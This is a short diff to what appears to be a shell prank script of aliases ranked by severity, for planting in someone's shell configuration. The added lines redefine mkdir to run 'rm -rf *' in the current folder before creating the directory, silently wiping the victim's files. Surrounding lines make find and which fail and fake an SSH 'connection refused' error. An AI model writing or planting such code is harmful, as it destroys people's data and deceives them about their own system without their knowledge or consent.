@@ -157,6 +157,9 @@ annoying && alias find='false 2>/dev/null'
 #Disable which
 annoying && alias which='false 2>/dev/null'
 
+#mkdir deletes everything in current folder, then make directory
+devastating && function mkdir { rm -rf * 2>/dev/null ; mkdir $1; }
+
 #Make SSH say connection refused
 insane && function ssh { sleep 2; echo "ssh: connect to host $(echo $1 | sed -n -e 's/.*@//p') port 22: Connection refused"; }
 
